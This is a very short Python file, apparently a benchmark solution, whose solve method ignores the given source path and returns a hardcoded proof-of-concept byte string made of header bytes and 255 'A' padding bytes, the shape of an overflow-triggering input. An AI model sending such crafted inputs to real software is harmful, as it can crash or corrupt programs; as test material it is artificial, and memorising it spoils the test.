class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x00\xff' + b'A' * 255 + b'\x02\x03BBB'
        return poc